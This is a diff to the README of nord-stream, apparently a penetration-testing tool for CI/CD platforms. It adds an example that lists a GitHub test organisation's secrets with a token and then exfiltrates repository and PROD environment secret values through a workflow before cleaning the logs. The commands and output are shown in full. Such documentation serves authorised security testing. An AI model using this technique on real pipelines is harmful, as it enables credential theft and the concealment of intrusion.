@@ -12,7 +12,7 @@ Find out more in the following blogpost: https://www.synacktiv.com/publications/
   - [Table of Contents](#table-of-contents)
   - [Installation](#installation)
   - [Usage](#usage)
-    - [General usage](#general-usage)
+    - [Shared arguments](#shared-arguments)
       - [Describe token](#describe-token)
       - [Build YAML](#build-yaml)
       - [YAML](#yaml)
@@ -46,7 +46,45 @@ $ pip3 install -r requirements.txt
 
 ## Usage
 
-### General usage
+Here is a simple example on GitHub; initially, one can enumerate the various secrets.
+```sh
+$ nord-stream.py github --token "$GHP" --org s1n-cicd-tests --list-secrets --repo TestCICD
+[*] Listing secrets:
+[*] "s1n-cicd-tests/TestCICD" secrets
+[*] Repo secrets:
+        - REPO_SECRET
+        - SUPER_SECRET
+[*] PROD secrets:
+        - PROD_SECRET
+```
+
+Then proceed to the exfiltration:
+```sh
+python3 nord-stream.py github --token "$GHP" --org s1n-cicd-tests --repo TestCICD  
+[+] "s1n-cicd-tests/TestCICD"
+[*] No branch protection rule found on "dev_remote_ea5Eu/test/v1" branch
+[*] Getting secrets from repo: "s1n-cicd-tests/TestCICD"
+[*] Getting workflow output
+[!] Workflow not finished, sleeping for 15s
+[+] Workflow has successfully terminated.
+[+] Secrets:
+secret_SUPER_SECRET=value for super secret
+secret_REPO_SECRET=repository secret
+
+[*] Getting secrets from environment: "PROD" (s1n-cicd-tests/TestCICD)
+[*] Getting workflow output
+[!] Workflow not finished, sleeping for 15s
+[+] Workflow has successfully terminated.
+[+] Secrets:
+secret_PROD_SECRET=Value only accessible from prod environment
+
+[*] Cleaning logs.
+[*] Check output: /home/hugov/Documents/pentest/RD/CICD/tools/nord-stream/nord-stream/nord-stream-logs/github
+```
+
+### Shared arguments
+
+Some arguments are shared between [GitHub](#github), [Azure DevOps](#azure-devops) and [GitLab](#gitlab) here are some examples.
 
 #### Describe token
 
